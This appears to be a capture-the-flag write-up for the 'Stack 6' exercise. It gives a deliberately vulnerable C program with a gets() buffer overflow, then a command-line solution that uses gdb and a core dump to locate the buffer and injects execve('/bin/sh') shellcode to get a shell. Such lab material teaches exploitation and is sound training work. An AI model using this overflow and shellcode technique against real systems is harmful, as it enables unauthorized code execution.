
# Stack 6

### Task
```
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  void getpath()
  {
    char buffer[64];
    unsigned int ret;

    printf("input path please: "); fflush(stdout);

    gets(buffer);

    ret = __builtin_return_address(0);

    if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
    }

    printf("got path %s\n", buffer);
  }

  int main(int argc, char **argv)
  {
    getpath();
  }
```

### Solution
```
   gdb stack6
      disas getpath
      quit
  ulimit -c unlimited
  python -c "print('A' * 80 + 'BBBB')" | ./stack6
  ls /tmp
  gdb ./stack6 /tmp/core.11.stack6.1453 -q
      info file
      find /w1 0xb7fde000, 0xb7fe2000, 0x41414141
      x/20x 0xb7fde000
      quit
  (python -c "print('\x90' * 4 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' + '\xcc' * (80 - 24 - 4) + '\xb7\xfd\xe0\x04'[::-1])"; cat) | ./stack6
```
![stack 6(1)](./img/6(1).png)
![stack 6(2)](./img/6(2).png)
![stack 6(3)](./img/6(3).png)
![stack 6(4)](./img/6(4).png)
![stack 6(5)](./img/6(5).png)
![stack 6(6)](./img/6(6).png)
